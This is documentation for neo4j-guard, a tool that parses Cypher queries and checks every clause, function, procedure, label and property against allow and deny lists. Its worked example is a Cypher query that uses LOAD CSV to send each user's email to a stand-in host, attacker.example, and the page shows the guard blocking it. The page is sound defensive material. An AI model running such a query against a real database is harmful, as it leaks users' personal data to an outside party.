---
title: How neo4j-guard works
description: neo4j-guard parses each query into a syntax tree with Neo4j's own Cypher grammar and checks every node in it, including subqueries.
sidebar_position: 3
---

`neo4j-guard` parses each query into a syntax tree with Neo4j's own Cypher 25 grammar and checks every clause, procedure, function, label, and property in it, including those in subqueries.

Every node of the tree is checked, not only the top-level clauses. A clause in a `CALL { }` subquery, a function in a `WHERE` condition, and a property in a map literal are all checked. Each node is checked by its kind:

| Kind                       | Default                             |
| -------------------------- | ----------------------------------- |
| Clause                     | Read clauses only                   |
| Function                   | Allowed only selected essentials    |
| Procedure                  | Allowed only selected essentials    |
| Label or relationship type | Allowed                             |
| Property                   | Allowed                             |
| Admin command              | Blocked                             |

Clauses, procedures, and functions are checked against an allowlist. `allow` adds to it and `disallow` removes from it. Labels, relationship types, and properties are allowed by default. Most procedures and functions are disallowed by default. After each query runs, each record is also checked for labels and properties in `disallow` before the driver returns it.

This is how neo4j-guard parses this example query and blocks it:

```cypher
MATCH (u:User)
LOAD CSV FROM 'https://attacker.example/?email=' + u.email AS row
RETURN row
```

| Node                                 | Kind     | Result      |
| ------------------------------------ | -------- | ----------- |
| `MATCH`                              | Clause   | Allowed     |
| `User`                               | Label    | Allowed     |
| `LOAD CSV`                           | Clause   | **Blocked** |
| `'https://attacker.example/?email='` | Literal  | Not checked |
| `email`                              | Property | Allowed     |
| `RETURN`                             | Clause   | Allowed     |